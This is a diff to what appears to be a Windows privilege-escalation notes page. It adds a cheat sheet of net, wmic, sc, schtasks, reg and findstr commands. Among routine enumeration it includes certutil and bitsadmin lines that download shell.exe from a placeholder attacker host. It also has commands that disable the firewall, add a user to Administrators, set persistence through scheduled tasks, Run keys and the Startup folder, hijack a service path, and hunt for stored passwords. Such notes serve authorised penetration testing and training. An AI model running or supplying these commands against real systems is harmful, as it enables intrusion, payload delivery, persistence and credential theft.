@@ -12,7 +12,7 @@ Privilege escalation on Windows is **primarily enumeration**.
 
 ---
 
-# 0. Net Enumeration
+# 0. Net Enumeration and Other Quick Useful Commands
 
 
 ```
@@ -45,6 +45,136 @@ net start <Spooler> // Start a service
 net stop <Spooler> // Stop a service
 net accounts // View local password policy
 net accounts /domain // View domain password policy
+```
+
+Other useful commands
+
+```
+:: USERS & GROUPS
+net user
+net user Administrator
+net user user1 Password123! /add
+net localgroup
+net localgroup administrators
+net localgroup administrators user1 /add
+net user /domain
+net group /domain
+net group "Domain Admins" /domain
+
+:: WHOAMI
+whoami
+whoami /all
+whoami /priv
+whoami /groups
+
+:: SYSTEM ENUMERATION
+hostname
+systeminfo
+wmic qfe
+set
+
+:: NETWORK ENUMERATION
+ipconfig /all
+route print
+arp -a
+netstat -ano
+ipconfig /displaydns
+
+:: SHARES & SMB
+net share
+net view
+net view \\TARGET
+net use
+net use \\TARGET\share
+net use Z: \\TARGET\share
+net use Z: /delete
+
+:: FIREWALL
+netsh advfirewall show allprofiles
+netsh advfirewall set allprofiles state off
+netsh advfirewall set allprofiles state on
+
+:: SCHEDULED TASKS
+schtasks
+schtasks /query
+schtasks /query /fo LIST /v
+schtasks /create /sc minute /mo 1 /tn updater /tr C:\temp\shell.exe
+
+:: SERVICES
+sc query
+sc qc Spooler
+sc start Spooler
+sc stop Spooler
+sc config VulnService binPath= "C:\temp\shell.exe"
+
+:: WMIC
+wmic process list brief
+wmic service list brief
+wmic startup list full
+wmic product get name,version
+wmic useraccount get name,sid
+
+:: PROCESSES
+tasklist
+tasklist /v
+tasklist /svc
+taskkill /PID 1234 /F
+
+:: FILE HUNTING
+dir proof.txt /s /b C:\
+dir local.txt /s /b C:\
+dir *.config /s /b
+dir unattend.xml /s /b C:\
+findstr /si password *.txt *.ini *.config *.xml
+findstr /spin "password" *.*
+
+:: REGISTRY
+reg query HKLM\Software
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions
+
+:: USERS & SESSIONS
+query user
+quser
+qwinsta
+
+:: CREDENTIAL HUNTING
+cmdkey /list
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+:: POWERSHELL
+powershell -ExecutionPolicy Bypass
+powershell -enc BASE64
+
+:: LOLBAS
+certutil -urlcache -split -f http://attacker/shell.exe shell.exe
+certutil -decode payload.b64 shell.exe
+bitsadmin /transfer job http://attacker/file.exe C:\temp\file.exe
+
+:: PERSISTENCE
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d C:\temp\shell.exe
+copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+:: ACTIVE DIRECTORY
+nltest /domain_trusts
+nltest /dclist:DOMAIN.LOCAL
+
+:: RESTRICTED SHELL TRICKS
+cmd.exe /c whoami
+wmic process call create "cmd.exe /c whoami"
+
+:: PASSWORD POLICY
+net accounts
+net accounts /domain
+
+:: OPEN FILES & SESSIONS
+net session
+net file
+
+:: SERVICES VIA NET
+net start
+net stop Spooler
+net start Spooler
 ```
 
 ---
